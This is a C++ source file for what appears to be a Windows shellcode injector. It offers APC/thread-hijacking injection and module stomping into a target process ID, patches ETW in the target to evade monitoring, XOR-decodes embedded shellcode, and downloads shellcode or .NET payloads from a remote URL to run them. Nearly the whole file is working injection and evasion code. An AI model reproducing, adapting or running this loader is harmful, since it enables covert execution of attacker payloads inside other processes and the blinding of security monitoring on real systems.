#include "def.h"





#include "helper.hpp"
#include "syscall.hpp"
#include "debug.hpp"
#include "syscall_global.hpp"
#include "injector.hpp"
#include "apc.hpp"
#include "patch.hpp"
#include "dotnet.hpp"


#include <psapi.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <intrin.h>
#include <TlHelp32.h>




PVOID addr = NULL;
DWORD process_id = NULL;
HANDLE hProcess, hThread;
LPVOID rBuffer;
BOOL pMemory;









HANDLE threadHijacked = NULL;
HANDLE snapshot;
THREADENTRY32 threadEntry;
CONTEXT context;

VOID threadHijacking(HANDLE hProcess, LPVOID rBuffer, DWORD process_id) {

    HANDLE threadHijacked = apcInjector.findThread(process_id);



    apcInjector.mySuspendThread(threadHijacked);
    context.ContextFlags = CONTEXT_CONTROL;

    apcInjector.myThreadContext(threadHijacked, &context);

    // If context.Rip is 0 here, your syscall failed or flags were wrong
    //std::cout << "Original RIP: " << (PVOID)context.Rip << "\n";

    // Update RIP to our shellcode
    context.Rip = (DWORD64)rBuffer;

    //std::cout << "Modified RIP: " << context.Rip << "\n";
    apcInjector.myNtSetContextThread(threadHijacked, &context);

    apcInjector.myNtResumeThread(threadHijacked);

    mainInjector.closeH(threadHijacked);

};






void apcQueueInjection(int pid, SIZE_T shellcode_len, unsigned char* shellcode) {
    hProcess = mainInjector.process(pid);
    rBuffer = mainInjector.vAlloc(hProcess, addr, shellcode_len);
    mainInjector.wrMem(hProcess, rBuffer, shellcode, shellcode_len);
    BOOL ok = mainInjector.protectMem(hProcess, rBuffer, shellcode_len);
    std::cout << "thread hijacking !!";

     
    threadHijacking(hProcess, rBuffer, pid);
    mainInjector.closeH(hProcess);
    std::cout << " [+] Succesfully " << std::endl;
    
}


void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
    std::cout << "-------In moduleStomping function-------\n";

	std::cout << "Going to inject shellcode, shellcode is : " << shellcode << "specified shellcode_len param is : " << shellcode_len << "\n";
    wchar_t moduleToInject[] = L"C:\\windows\\system32\\wininet.dll";
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;

    hProcess = mainInjector.process(pid);
	std::cout << "Handle for pid " << pid << ": " << hProcess << "\n";
	std::cout << "patching etw !!\n";
	patchRemoteETW(hProcess);
	//patchRemoteAmsi(hProcess);
    rBuffer = mainInjector.vAlloc(hProcess, NULL, sizeof(moduleToInject));
    //rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
    mainInjector.wrMem(hProcess, rBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject));
    //WriteProcessMemory(hProcess, rBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject), NULL);

    unsigned char* k = helperHandler.getKernel32();

    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    

    PVOID pLoadLibraryW = syscallHandler.getFunctionAddressByHash(wK, 1606414609);
	std::cout << "LoadLibraryW address: " << pLoadLibraryW << "\n";
    // 3. Cast it to the function pointer type for use in CreateRemoteThread or ntThread
    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)pLoadLibraryW;
    //ntThread(hProcess, rBuffer);
	std::cout << "Injecting DLL C:\\windows\\system32\\wininet.dll in handle " << hProcess << "at the startAdress of " << threadRoutine << " \n";
    HANDLE dllThread = mainInjector.ntThread(hProcess, threadRoutine, rBuffer);
    mainInjector.waitForSingle(dllThread);

	
    std::cout << "[...]  finding base address of the injected DLL in remote process" << std::endl;
    remoteModule = (HMODULE)mainInjector.findRemoteModule(hProcess, L"wininet.dll");
    std::cout << "[+]  found base address of the injected wininet.dll in remote process, HMODULE: " << remoteModule << std::endl;
    // get DLL's AddressOfEntryPoint
    DWORD headerBufferSize = 0x1000;
    std::cout << "allocating heap" << "\n";
	std::cout << "aloocating some space for the DLL headers in the local process to read the headers from the remote process" << "\n";
    PVOID targetProcessHeaderBuffer = mainInjector.vAlloc(
        (HANDLE)-1,           // (HANDLE)-1 is a pseudo-handle for the current process
        NULL,                 // Let the OS pick the address
        headerBufferSize      // 4KB is enough for PE headers
    );
	std::cout << "allocated local buffer at: " << targetProcessHeaderBuffer << " to read remote DLL headers\n";
    sysNtReadVirtualMemory(hProcess, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
    PVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
    std::cout << ", entryPoint at " << dllEntryPoint;
    SIZE_T bytesWritten = 0;
    
	DWORD oldProtect = 0;
	SIZE_T size = 0x4000;
	std::cout << "changing permissions to rw for the entry point of the injected DLL in the remote process before sending it\n";
    NTSTATUS rwxStatus = mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_READWRITE, shellcode_len);
   
	std::cout << "\nstatus after changing permissions to rwx: " << rwxStatus << "\n";
	std::cout << "writing shellcode to the entry point of the injected DLL in the remote process\n";
    NTSTATUS status = mainInjector.wrMem(hProcess, dllEntryPoint, (LPVOID)shellcode, shellcode_len);
	std::cout << "\nstatus after writing shellcode to dllentryPoint: " << status << "\n";
	std::cout << "changing permissions to rx for the entry point of the injected DLL in the remote process\n";
    mainInjector.protectMemFlag(hProcess, dllEntryPoint, PAGE_EXECUTE_READ, shellcode_len);
    //sysNtProtectVirtualMemory(hProcess, &dllEntryPoint, &len_shellcode, PAGE_EXECUTE_READ, &oldProtect);
    // execute shellcode from inside the benign DLL
	std::cout << "creating remote thread at the entry point of the injected DLL in the remote process to execute our shellcode\n";
	mainInjector.ntThread(hProcess, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL);
    

}

void InvokeDllMain(HMODULE hMappedModule) {
    typedef BOOL(WINAPI* f_DllMain)(HINSTANCE, DWORD, LPVOID);
    // 1. Get pointers to headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hMappedModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMappedModule + dosHeader->e_lfanew);

    // 2. Calculate the absolute address of the Entry Point
    // AddressOfEntryPoint is a Relative Virtual Address (RVA)
    uintptr_t entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;

    if (entryPointRVA == 0) {
        std::cout << "[!] DLL has no entry point defined.\n";
        return;
    }

    f_DllMain pDllMain = (f_DllMain)((BYTE*)hMappedModule + entryPointRVA);

    std::cout << "[+] Invoking DllMain at: " << (void*)pDllMain << "\n";

    // 3. Call DLL_PROCESS_ATTACH (1)
    // This initializes the DLL.
    if (pDllMain((HINSTANCE)hMappedModule, DLL_PROCESS_ATTACH, nullptr)) {
        std::cout << "[+] DllMain initialized successfully.\n";
    }
    else {
        std::cout << "[-] DllMain returned FALSE (Initialization failed).\n";
    }
}
//debug antiDebug;
int main(int argc, char* argv[]) {
    /*
    std::vector<unsigned char> buff = ReadFileToBuffer("hello.dll");
    std::cout << "hello.dll size: " << buff.size() << "\n";
    HMODULE helloWorld = (HMODULE)LocalManualMap(buff.data());
    InvokeDllMain(helloWorld);
	std::cout << "LdrLoadDll: " << helperHandler.simpleHash("LdrLoadDll") << "\n";
    /*if (antiDebug.checkDebug()) {
        std::cout << "Hello world !!!";
        return 0;
    };
    */
    try {
        helper::Options opt = helperHandler.parseArgs(argc, argv);

        //std::cout << "Parsed options - PID: " << opt.pid << ", Method: " << opt.method << ", Use Remote: " << opt.useRemote << "\n";
        if (opt.mode == "dotnet") {
            //std::wcout << "Parsed options - path: " << opt.filePath << ", args: " << opt.args << "\n";
            if(opt.useRemote){
                std::cout << "[+] Remote dotnet\n";
				std::wstring url = opt.url + opt.file;
                InitDotnet(url, true, opt.args, opt.https);
			}
            else {
                InitDotnet(opt.filePath, false, opt.args, opt.https);
            }
            
            std::cout << "Press Enter to exit...";
            std::cin.get();
            return 0;
        }

        if (opt.pid == 0 || opt.method.empty()) {
            helperHandler.printHelp(argv[0]);
            return 1;
        }

        if (opt.method != "apc" && opt.method != "stomp") {
            std::cout << "Invalid method\n";
            return 1;
        }

        std::vector<unsigned char> shellcode_vector;
        std::cout << "Init shellcode_vector\n";
        if (opt.useRemote) {
            if (opt.url.empty() || opt.file.empty()) {
                std::cout << "Missing remote url/file\n";
                return 1;
            }

            shellcode_vector = helperHandler.fetchRemoteShellcodeAndDecode(
                opt.url,
                opt.file,
                opt.key,
                opt.https
            );
            std::cout << "Downloaded bytes: " << shellcode_vector.size() << "\n";
            std::cout << "Decoding shellcode with key : " << (int)opt.key << "\n";
        }

        else {



            helperHandler.xor_shellcode(shellcode, shellcode_len, opt.key);
        }
        std::cout << "pid: " << opt.pid << "\n";


        process_id = opt.pid;

        if (opt.method == "apc" && opt.useRemote) {
            apcQueueInjection(process_id, shellcode_vector.size(), shellcode_vector.data());
        }
        else if (opt.method == "apc") {
            apcQueueInjection(process_id, (SIZE_T)shellcode_len, shellcode);
        }
        else if (opt.method == "stomp" && opt.useRemote) {


            moduleStomping(process_id,
                shellcode_vector.data(),
                shellcode_vector.size());
        }
        else if (opt.method == "stomp") {
            moduleStomping(process_id,
                shellcode,
                shellcode_len);
        }
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }
 
	
}